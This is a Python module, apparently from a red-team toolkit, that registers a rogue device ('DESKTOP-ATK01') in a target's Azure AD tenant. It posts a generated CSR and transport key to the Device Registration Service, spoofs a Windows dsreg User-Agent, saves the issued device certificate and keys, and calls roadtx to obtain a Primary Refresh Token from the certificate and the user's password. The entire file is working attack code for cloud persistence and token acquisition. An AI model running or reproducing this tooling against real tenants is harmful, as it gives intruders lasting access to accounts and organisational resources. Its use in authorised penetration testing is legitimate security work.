"""Module 2: Device registration + PRT.

Two registration paths:
 - NATIVE: build CSR + BCRYPT TransportKey, POST to the DRS EnrollmentServer with a DRS token,
   parse the Azure-AD-issued device cert. Full control, no roadtx needed for the join itself.
 - roadtx: `roadtx device -a register` (fallback / parity with the engagement).

PRT acquisition (Step 5) uses roadtx (device cert + password -> PRT + session key). Native PRT
issuance needs the mTLS device-cert handshake, which roadtx already does correctly.
"""
import json
import os
import shutil
import subprocess

import requests
from cryptography.hazmat.backends import default_backend
from cryptography import x509

from lib import devicekeys
from lib.logger import logged_session, get as get_log
from lib.util import decode_jwt

DRS_REGISTER_URL = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0"
DSREG_UA = "Dsreg/10.0 (Windows 10.0.19045)"


def _have_roadtx():
    return shutil.which("roadtx") is not None


def run(cfg, eng, args):
    native = getattr(args, "native", False)
    drs_tok = eng.load_token("drs")

    # Native path whenever we hold a DRS token (full control, no roadtx needed for the join).
    if drs_tok and drs_tok.get("access_token"):
        reg = register_native(cfg, eng, drs_tok["access_token"],
                              display_name=getattr(args, "device_name", None) or "DESKTOP-ATK01")
        if reg.get("device_id") and _have_roadtx():
            _roadtx_prt(cfg, eng, reg)
        elif reg.get("device_id"):
            print("[device-reg] Device registered natively. Install roadtx to obtain the PRT "
                  "(roadtx prt -a request -c <cert.pfx> -u <user> -p <pass>), then set prt_path.")
        return reg

    if not drs_tok:
        print("[device-reg] No DRS token stored. Run `drs` (or `prt-flow --resource drs`) first "
              "to obtain one, then re-run device-reg.")
    if not _have_roadtx():
        return _keys_only(cfg, eng)
    return _roadtx_full(cfg, eng, args)


def register_native(cfg, eng, drs_token, display_name="DESKTOP-ATK01", target_domain=None):
    """Generate crypto material, call the DRS registration API, parse the cert."""
    log = get_log()
    log.info("[device-reg] === Native DRS Device Registration ===")
    log.info("[device-reg] Generating RSA-2048 device key pair...")
    device_key = devicekeys.gen_rsa()
    log.info("[device-reg] Generating RSA-2048 transport key pair...")
    transport_key = devicekeys.gen_rsa()

    # device_id placeholder for the CSR subject; Azure assigns the real one in the issued cert.
    claims = decode_jwt(drs_token)
    domain = target_domain or (cfg.username.split("@")[1] if "@" in cfg.username else cfg.tenant_id)
    placeholder_id = claims.get("oid") or "00000000-0000-0000-0000-000000000000"

    body = {
        "CertificateRequest": {"Type": "pkcs10", "Data": devicekeys.csr_der_b64(device_key, placeholder_id)},
        "TransportKey": devicekeys.transport_key_blob_b64(transport_key),
        "TargetDomain": domain,
        "DeviceType": "Windows",
        "OSVersion": "10.0.19045.2965",
        "DeviceDisplayName": display_name,
        "JoinType": 4,  # Azure AD registered (workplace join)
        "attributes": {"ReuseDevice": "true", "ReturnClientSid": "true"},
    }
    log.info(f"[device-reg] Building CSR for placeholder OID {placeholder_id}...")
    log.info(f"[device-reg] Building BCRYPT_RSAPUBLIC_BLOB TransportKey...")
    log.info(f"[device-reg] Target domain: {domain}, display name: {display_name}")
    log.info(f"[device-reg] Posting to DRS EnrollmentServer...")
    session = logged_session("device-reg")
    r = session.post(DRS_REGISTER_URL,
                     headers={"Authorization": f"Bearer {drs_token}", "Content-Type": "application/json",
                              "User-Agent": DSREG_UA},
                     json=body, timeout=30)
    log.info(f"[device-reg] DRS register response: {r.status_code}")
    if r.status_code != 200:
        print(f"[device-reg] Registration failed: {r.text[:400]}")
        eng.save_evidence("device_register_fail.txt", f"{r.status_code}\n{r.text}")
        return {"native": True, "error": f"http_{r.status_code}", "body": r.text[:400]}

    data = r.json()
    raw_b64 = data.get("Certificate", {}).get("RawBody", "")
    import base64
    cert = x509.load_der_x509_certificate(base64.b64decode(raw_b64), default_backend())
    device_id = cert.subject.rfc4514_string().split("CN=")[-1].split(",")[0]
    thumb = cert.fingerprint(__import__("cryptography.hazmat.primitives.hashes",
                                       fromlist=["SHA1"]).SHA1()).hex().upper()

    # Persist keys + cert.
    with open(os.path.join(eng.certs, "device_key.pem"), "wb") as f:
        f.write(devicekeys.private_pem(device_key))
    with open(os.path.join(eng.certs, "transport_key.pem"), "wb") as f:
        f.write(devicekeys.private_pem(transport_key))
    cert_path = os.path.join(eng.certs, "device_cert.pem")
    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(__import__("cryptography.hazmat.primitives.serialization",
                                             fromlist=["Encoding"]).Encoding.PEM))

    valid_to = (cert.not_valid_after_utc if hasattr(cert, "not_valid_after_utc") else cert.not_valid_after).isoformat()
    result = {"native": True, "device_id": device_id, "thumbprint": thumb,
              "cert_path": cert_path, "display_name": display_name,
              "membership_changes": data.get("MembershipChanges"),
              "valid_to": valid_to}
    eng.save_json("evidence", "device_reg", result)
    log.info(f"[device-reg] === DEVICE REGISTERED SUCCESSFULLY ===")
    log.info(f"[device-reg]   Device ID:    {device_id}")
    log.info(f"[device-reg]   Display Name: {display_name}")
    log.info(f"[device-reg]   Thumbprint:   {thumb}")
    log.info(f"[device-reg]   Valid Until:   {valid_to}")
    log.info(f"[device-reg]   SID(s):       {data.get('MembershipChanges')}")
    log.info(f"[device-reg]   Cert saved:   {cert_path}")
    log.info(f"[device-reg]   Keys saved:   {eng.certs}")
    return result


def _roadtx_prt(cfg, eng, reg):
    """Step 5: build PFX from device cert+key, then obtain PRT via roadtx."""
    from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption, Encoding
    from cryptography.hazmat.primitives.serialization import load_pem_private_key

    cert_path = reg.get("cert_path")
    key_path = os.path.join(eng.certs, "device_key.pem")
    pfx_path = os.path.join(eng.certs, "device.pfx")

    with open(key_path, "rb") as f:
        key = load_pem_private_key(f.read(), password=None, backend=default_backend())
    with open(cert_path, "rb") as f:
        cert = x509.load_pem_x509_certificate(f.read(), default_backend())

    pfx_data = pkcs12.serialize_key_and_certificates(
        name=b"device", key=key, cert=cert, cas=None,
        encryption_algorithm=NoEncryption())
    with open(pfx_path, "wb") as f:
        f.write(pfx_data)
    print(f"[device-reg] PFX built: {pfx_path}")

    env = dict(os.environ)
    if cfg.password:
        env["AZCA_PASSWORD"] = cfg.password
    prt_cmd = ["roadtx", "prt", "-a", "request", "-c", pfx_path,
               "-u", cfg.username, "-p", cfg.password or ""]
    result = subprocess.run(prt_cmd, cwd=eng.certs, capture_output=True, text=True, env=env)
    print(result.stdout[-400:] if result.stdout else "")
    if result.returncode != 0:
        print(f"[device-reg] roadtx PRT failed: {result.stderr[-400:]}")
        print(f"[device-reg] Manual: roadtx prt -a request -c {pfx_path} -u {cfg.username} -p <pass>")
        return
    roadtx_prt = os.path.join(eng.certs, "roadtx.prt")
    if os.path.exists(roadtx_prt):
        print(f"[device-reg] PRT obtained: {roadtx_prt}")
        cfg["prt_path"] = roadtx_prt


def _roadtx_full(cfg, eng, args):
    print("[device-reg] roadtx device register + PRT request...")
    env = dict(os.environ)
    if cfg.password:
        env["AZCA_PASSWORD"] = cfg.password
    reg = subprocess.run(["roadtx", "device", "-a", "register"], cwd=eng.certs,
                         capture_output=True, text=True, env=env)
    print(reg.stdout[-800:] if reg.stdout else "")
    if reg.returncode != 0:
        print(f"[device-reg] roadtx register failed:\n{reg.stderr[-600:]}")
        return {"roadtx": True, "error": "register_failed"}
    prt_cmd = ["roadtx", "prt", "-a", "request", "-u", cfg.username]
    if cfg.password:
        prt_cmd += ["-p", cfg.password]
    subprocess.run(prt_cmd, cwd=eng.certs, capture_output=True, text=True, env=env)
    roadtx_prt = os.path.join(eng.certs, "roadtx.prt")
    if os.path.exists(roadtx_prt):
        print(f"[device-reg] PRT -> {roadtx_prt}. Set config.prt_path to it.")
        return {"roadtx": True, "prt_path": roadtx_prt}
    return {"roadtx": True, "error": "prt_failed"}


def _keys_only(cfg, eng):
    dk = devicekeys.gen_rsa()
    with open(os.path.join(eng.certs, "device_key.pem"), "wb") as f:
        f.write(devicekeys.private_pem(dk))
    print("[device-reg] roadtx not found and no DRS token. Generated a device key only.")
    print("[device-reg] Obtain a DRS token (run `drs`) then re-run for native registration.")
    return {"native": False, "roadtx": False, "keys_only": True}
